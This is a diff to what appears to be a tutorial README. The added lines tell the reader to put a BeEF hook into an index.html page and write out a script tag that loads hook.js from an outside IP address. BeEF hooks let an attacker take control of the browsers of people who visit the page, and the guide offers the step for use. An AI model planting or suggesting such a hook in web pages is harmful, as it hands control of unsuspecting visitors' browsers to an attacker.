@@ -75,6 +75,12 @@ nano into the index.html file
 <img width="1508" height="144" alt="Screenshot 2025-08-26 164856" src="https://github.com/user-attachments/assets/aaf151f9-7b38-4e1f-bdda-5b31b75e4743" />
 
 
+Scroll down to the bottom add your beef hook link everyones is different as an embedded javascript
+
+<img width="1524" height="798" alt="Screenshot 2025-08-26 165244" src="https://github.com/user-attachments/assets/d92811a9-7dc2-486b-a910-b9304b36c1ba" />
+
+
+<script src="http://209.38.16.144:3000/hook.js></script>
 
 
 
